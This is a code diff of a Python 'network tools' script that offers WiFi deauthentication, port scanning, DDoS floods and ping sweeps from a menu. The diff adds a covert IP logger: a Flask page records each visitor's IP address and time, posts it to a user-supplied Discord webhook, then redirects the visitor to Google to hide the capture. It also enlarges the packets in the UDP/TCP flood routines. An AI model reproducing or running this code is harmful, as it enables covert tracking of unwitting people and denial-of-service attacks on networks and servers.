@@ -17,7 +17,11 @@ import os
 import time
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, RadioTap
-import requests
+try:
+    import requests
+except ImportError:
+    os.system("pip install requests")
+import numpy
 urllib3.disable_warnings()
 
 CEND      = '\33[0m'
@@ -64,30 +68,40 @@ CVIOLETBG2 = '\33[105m'
 CBEIGEBG2  = '\33[106m'
 CWHITEBG2  = '\33[107m'                                    
 
+
+logogradient1 = '\033[38;2;221;255;196m\033[0m'
+logogradient2 = '\033[38;2;213;252;174m\033[0m'
+logogradient3 = '\033[38;2;182;255;128m\033[0m'
+logogradient4 = '\033[38;2;171;255;110m\033[0m'
+logogradient5 = '\033[38;2;159;255;89m\033[0m'
+logogradient6 = '\033[38;2;147;255;69m\033[0m'
+logogradient7 = '\033[38;2;134;252;48m\033[0m'
+logogradient8 = '\033[38;2;113;252;32m\033[0m'
+
 os.system("title ZeroTier™ Network Tools - By Elliot (starykapec)")
 
 def logo():
     print("")
-    print(CGREEN+"▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▓▓█████  ██▀███  ")
-    print("▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓█   ▀ ▓██ ▒ ██▒")
-    print("░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒███   ▓██ ░▄█ ▒")
-    print("  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░▒▓█  ▄ ▒██▀▀█▄  ")
-    print("▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒████▒░██▓ ▒██▒")
-    print("░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  For Windows")
-    print("░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░ ░  ░  ░▒ ░ ▒░  By Elliot (ZeroTier™)")
-    print("░     ░        ░        ░             ░       ░         ░        v1.0       "+CEND)
+    print("\033[38;2;221;255;196m▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▓▓█████  ██▀███  \033[0m")
+    print("\033[38;2;203;250;167m▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓█   ▀ ▓██ ▒ ██▒\033[0m")
+    print("\033[38;2;182;255;128m░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒███   ▓██ ░▄█ ▒\033[0m")
+    print("\033[38;2;171;255;110m  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░▒▓█  ▄ ▒██▀▀█▄  \033[0m")
+    print("\033[38;2;159;255;89m▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒████▒░██▓ ▒██▒ \033[0m")
+    print("\033[38;2;147;255;69m░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  For Windows\033[0m")
+    print("\033[38;2;134;252;48m░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░ ░  ░  ░▒ ░ ▒░  By Elliot (ZeroTier™)\033[0m")
+    print("\033[38;2;113;252;32m░     ░        ░        ░             ░       ░         ░        v1.0       \033[0m"+CEND)
     print(CYELLOW+CBOLD+"════════════════════════════════════════════════════════════════════════════════"+CEND)
 
 def menulogo():
     print("")
-    print(CGREEN+"▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▓▓█████  ██▀███  ")
-    print("▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓█   ▀ ▓██ ▒ ██▒")
-    print("░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒███   ▓██ ░▄█ ▒")
-    print("  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░▒▓█  ▄ ▒██▀▀█▄  ")
-    print("▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒████▒░██▓ ▒██▒")
-    print("░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  For Windows")
-    print("░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░ ░  ░  ░▒ ░ ▒░  By Elliot (ZeroTier™)")
-    print("░     ░        ░        ░             ░       ░         ░        v1.0       "+CEND)
+    print("\033[38;2;221;255;196m▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▓▓█████  ██▀███  \033[0m")
+    print("\033[38;2;190;255;166m▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓█   ▀ ▓██ ▒ ██▒\033[0m")
+    print("\033[38;2;182;255;128m░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒███   ▓██ ░▄█ ▒\033[0m")
+    print("\033[38;2;171;255;110m  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░▒▓█  ▄ ▒██▀▀█▄  \033[0m")
+    print("\033[38;2;159;255;89m▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒████▒░██▓ ▒██▒ \033[0m")
+    print("\033[38;2;147;255;69m░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  For Windows\033[0m")
+    print("\033[38;2;134;252;48m░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░ ░  ░  ░▒ ░ ▒░  By Elliot (ZeroTier™)\033[0m")
+    print("\033[38;2;113;252;32m░     ░        ░        ░             ░       ░         ░        v1.0       \033[0m"+CEND)
     print(CYELLOW+CBOLD+"╔══════════════════════════════════════════════════════════════════════════════╗"+CEND)
 
                                         
@@ -107,8 +121,9 @@ def main():
     print(CBOLD+CYELLOW+"╠ 2. Wifi Deauth attack          "+CEND+CBOLD+"Shutdowns network"+CBOLD+CYELLOW+"                             ║")
     print(CBOLD+CYELLOW+"╠ 3. TCP Port Scanner            "+CEND+CBOLD+"Scans ports for server IP"+CBOLD+CYELLOW+"                     ║")
     print(CBOLD+CYELLOW+"╠ 4. DDoS attacks                "+CEND+CBOLD+"Attacks IP with Distributed Denial of Service "+CBOLD+CYELLOW+"║")
-    print(CBOLD+CYELLOW+"╠ 5. Ping Sweep                  "+CEND+CBOLD+"Finds IP Adress of website"+CBOLD+CYELLOW+"                    ║")
-    print(CBOLD+CYELLOW+"╠ 6. Exit                        "+CEND+CBOLD+"Exits menu"+CBOLD+CYELLOW+"                                    ║")
+    print(CBOLD+CYELLOW+"╠ 5. Ping Sweep                  "+CEND+CBOLD+"Ping multiple IPs to find active hosts"+CBOLD+CYELLOW+"        ║")
+    print(CBOLD+CYELLOW+"╠ 6. Discord webhook IP grabber  "+CEND+CBOLD+"Grabs an user ip by using discord webhook"+CBOLD+CYELLOW+"     ║")
+    print(CBOLD+CYELLOW+"╠ 7. Exit                        "+CEND+CBOLD+"Exits menu"+CBOLD+CYELLOW+"                                    ║")
     print(CBOLD+CYELLOW+"╚══════════════════════════════════════════════════════════════════════════════╝"+CEND)
     selectoption = int(input(CBLINK2+"> "+CEND))
 
@@ -612,11 +627,11 @@ def main():
                     self.running = False
                     
                 def create_tcp_packet(self):
-                    packet = random._urandom(1024)
+                    packet = random._urandom(2048)
                     return packet
                 
                 def create_udp_packet(self):
-                    packet = random._urandom(1024)
+                    packet = random._urandom(2048)
                     return packet
                 
                 def tcp_flood(self):
@@ -700,6 +715,42 @@ def main():
         os.system("nslookup {weburl}"+CEND)
 
     elif selectoption == 6:
+        from flask import Flask, request, redirect
+        from datetime import datetime
+        import requests
+
+        app = Flask(__name__)
+
+        os.system("cls")
+        logo()
+        print("")
+        print("Enter discord webhook url")
+        webhook_url = input("> ")
+        def send_ip(ip, date):
+            data = {
+                "content": "",
+                "title": "ZeroTier IPLOGGER"
+            }
+            data["embeds"] = [
+                {
+                    "title": ip,
+                    "description": date
+                }
+            ]
+            requests.post(webhook_url, json=data)
+        @app.route("/")
+        def index():
+            ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
+            date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
+
+            send_ip(ip, date)
+
+            return redirect("https://google.com")
+        
+        if __name__ == "__main__":
+            app.run(host='0.0.0.0')
+
+    elif selectoption == 7:
         print("")
         print("Exiting...")
         time.sleep(1)
